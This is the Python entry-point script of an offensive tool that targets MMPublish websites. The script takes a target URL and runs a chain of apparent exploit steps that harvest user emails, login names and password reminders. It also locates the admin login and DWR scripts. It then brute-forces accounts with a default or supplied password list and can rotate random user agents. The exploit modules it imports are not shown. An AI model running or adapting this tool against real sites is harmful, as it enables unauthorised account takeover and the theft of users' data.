#!/usr/bin/env python
# -*- coding: utf-8 -*-


from core.cofe import *
from core.brute import * 
from txtAndColors import banner, critical
import requests
import argparse
import urllib3
import sys


if __name__ == '__main__':
    print(critical(banner()))
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", action="store", dest="url", help="MMPublish URL")
    parser.add_argument("--threads", action="store", dest="max_threads", default=1, help="Number of threads to use")
    parser.add_argument('--random-agent', action ='store_const', const='random_agent', dest='random_agent', default=False, help="Random User-Agent")
    parser.add_argument('--brute', action='store_const', const='brute', dest='brute', default=False, help="Brute a users retrieve from a file")
    parser.add_argument('--users-file', action='store', dest='users_file', help='Users file retrieve from previous exploit')
    parser.add_argument('--password-file', action='store', dest='password_file', help='Password file')
    parser.add_argument("--getremainder", action="store", dest="remainder", help="get password remainder for a input user", default=False)
    results = parser.parse_args()

    if results.url and results.brute:
        if results.users_file == None:
            print(warning("[+] Users file is required ! \n python3 main.py -u mmpub.com --random-agent --brute --users-file ex.txt"))
            exit()
        if results.password_file == None:
            print(warning("[+] Using a default password list !"))
            urllib3.disable_warnings()
            mmObj = Cofe(results.url, results.max_threads, results.random_agent)
            mmObj.RandomAgent()
            mmObj.CleanUrl()
            mmObj.ToString()
            mmObj.IsUpOrDown()
            mmObj.IsRobots()
            mmObj.HaveDWR()
            mmObj.GetAdminLogin()
            mmObj.xpltUserEmail()
            mmObj.XptGetUsersLogin()
            mmObj.SearchDWRScripts()
            answer = input(ask("[+] Start brute force ? Y/n: ")).lower()
            if answer[0] == "y":
                urllib3.disable_warnings()
                bruteObj = Brute(results.url, results.random_agent)
                bruteObj.CleanUrl()
                bruteObj.RandomAgent()
                bruteObj.DoBruteForceDefaultPass(results.users_file)
                exit()
            else:
                answer[0] == "n"
                print(display("[-] Thanks to use this tool.. issues are welcome.."))
                sys.exit()
                exit()
        
        if results.password_file:
            urllib3.disable_warnings()
            mmObj = Cofe(results.url, results.max_threads, results.random_agent)
            mmObj.RandomAgent()
            mmObj.CleanUrl()
            mmObj.ToString()
            mmObj.IsUpOrDown()
            mmObj.IsRobots()
            mmObj.HaveDWR()
            mmObj.GetAdminLogin()
            mmObj.xpltUserEmail()
            mmObj.XptGetUsersLogin()
            mmObj.SearchDWRScripts()
            answer = input(ask("[+] Start brute force ? Y/n: ")).lower()
            if answer[0] == "y":
                urllib3.disable_warnings()
                bruteObj = Brute(results.url, results.random_agent)
                bruteObj.CleanUrl()
                bruteObj.RandomAgent()
                bruteObj.DoBruteForce(results.users_file, results.password_file)
                exit()
            else:
                answer[0] == "n"
                print(display("[-] Thanks to use this tool.. issues are welcome.."))
                exit()

    if results.url:
        urllib3.disable_warnings()
        mmObj = Cofe(results.url, results.max_threads, results.random_agent)
        mmObj.RandomAgent()
        mmObj.CleanUrl()
        mmObj.ToString()
        mmObj.IsUpOrDown()
        mmObj.IsRobots()
        mmObj.HaveDWR()
        mmObj.GetAdminLogin()
        mmObj.xpltUserEmail()
        mmObj.XptGetUsersLogin()
        mmObj.SearchDWRScripts()

    if results.remainder and results.url != None:
        urllib3.disable_warnings()
        mmObj = Cofe(results.url, results.max_threads, results.random_agent)
        mmObj.RandomAgent()
        mmObj.CleanUrl()
        mmObj.ToString()
        mmObj.IsUpOrDown()
        mmObj.XptGetUsersLogin()
        mmObj.XptGetURemainder()

        
    